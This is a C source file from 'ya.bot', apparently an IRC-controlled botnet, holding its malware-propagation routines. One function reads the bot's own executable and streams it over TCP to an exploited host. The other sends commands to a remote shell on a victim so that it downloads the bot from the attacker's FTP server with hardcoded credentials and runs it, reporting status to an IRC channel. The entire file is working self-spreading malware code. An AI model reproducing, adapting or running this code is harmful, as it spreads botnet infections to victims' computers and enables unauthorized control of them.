/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_EXPSCAN
bool transfer_directtransfer(char *pszIP,
		int nPort,
		char *pszExploitName,
		SOCKET bsock,
		char *pszResultChannel,
		bool bSilent,
		bool bVerbose)
{
	char szBuffer[100], szFilePath[MAX_PATH];
	FILE *f;
	int nRead;
	sockaddr_in sin;
	SOCKET sock;

#ifndef NO_DEBUG
		debug_print("Transfering file, transfer_directtransfer()");
#endif

		Sleep(3000);
		GetModuleFileName(NULL, szFilePath, sizeof(szFilePath) - 1);
		f = fopen(szFilePath, string_filefopenreadbinary);
	if (!f)
	{
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, (char *)string_ircprivmsg, pszResultChannel,
						(char *)string_transferfailedtoconnect,
						CRED, string_replytransfer, CEND, string_replydotbot,
						CBLUE, CEND, pszIP, nPort,
						CBLUE, szFilePath, CEND,
						CBLUE, pszExploitName, CEND);
			return FALSE;
	}
		sin.sin_addr.s_addr = inet_addr(pszIP);
		sin.sin_family = AF_INET;
		sin.sin_port = htons(nPort);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR) 
	{
			fclose(f);
			closesocket(sock);
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, (char *)string_ircprivmsg, pszResultChannel,
						(char *)string_transferfailedtoconnect,
						CRED, string_replytransfer, CEND, string_replydotbot,
						CBLUE, CEND, pszIP, nPort,
						CBLUE, szFilePath, CEND,
						CBLUE, pszExploitName, CEND);
			return FALSE;
	}
	if ((!bSilent) && (bVerbose))
			irc_message(bsock, (char *)string_ircprivmsg, pszResultChannel,
					(char *)string_transferstarted,
					CBLUE, string_replytransfer, CEND, string_replydotbot,
					CBLUE, CEND, pszIP, nPort,
					CBLUE, szFilePath, CEND,
					CBLUE, pszExploitName, CEND);;
	while (!feof(f))
	{
			nRead = fread(szBuffer, sizeof(char), sizeof(szBuffer), f);
//			Sleep(200);
		if (send(sock, szBuffer, nRead, 0) == SOCKET_ERROR)
		{
				fclose(f);
				closesocket(sock);
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, (char *)string_ircprivmsg, pszResultChannel,
							(char *)string_transferfailed,
							CRED, string_replytransfer, CEND, string_replydotbot,
							CBLUE, CEND, pszIP, nPort,
							CBLUE, szFilePath, CEND,
							CBLUE, pszExploitName, CEND);
				return FALSE;
		}
	}
		fclose(f);
		closesocket(sock);
		g_nTransfers++;
	if (!bSilent)
			irc_message(bsock, (char *)string_ircprivmsg, pszResultChannel,
					(char *)string_transferfinished,
					CGREEN, string_replytransfer, CEND, string_replydotbot,
					CBLUE, CEND, pszIP, nPort,
					CBLUE, szFilePath, CEND,
					CBLUE, pszExploitName, CEND);
		return TRUE;
}

#ifndef NO_DAEMONFTP
bool transfer_shelltransfer(SOCKET bsock, char *pszIP, int nPort)
{
	char szBuffer[IRCBUF];
	sockaddr_in sin;
	SOCKET sock;
		
#ifndef NO_DEBUG
		debug_print("Sending command to remote shell, transfer_shelltransfer()");
#endif

		Sleep(3000);
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(pszIP);
		sin.sin_port = htons(nPort);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR) 
	{
			closesocket(sock);
			return FALSE;
	}
		_snprintf(szBuffer, sizeof(szBuffer) - 1,
			string_bindshellcmd,
			ip_getip(bsock), daemonftpport,
			daemonftpuser, daemonftppass,
			botfilename,
			botfilename,
			"\r\n");
	if (send(sock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
			return FALSE;
		Sleep(500);
		_snprintf(szBuffer, sizeof(szBuffer) - 1, string_bindshellstart1, botfilename, "\r\n");
	if (send(sock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
			return FALSE;
		Sleep(500); //Just making sure...
		_snprintf(szBuffer, sizeof(szBuffer) - 1, string_bindshellstart1, botfilename, "\r\n");
	if (send(sock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
			return FALSE;
		closesocket(sock);
		return TRUE;
}
#endif
#endif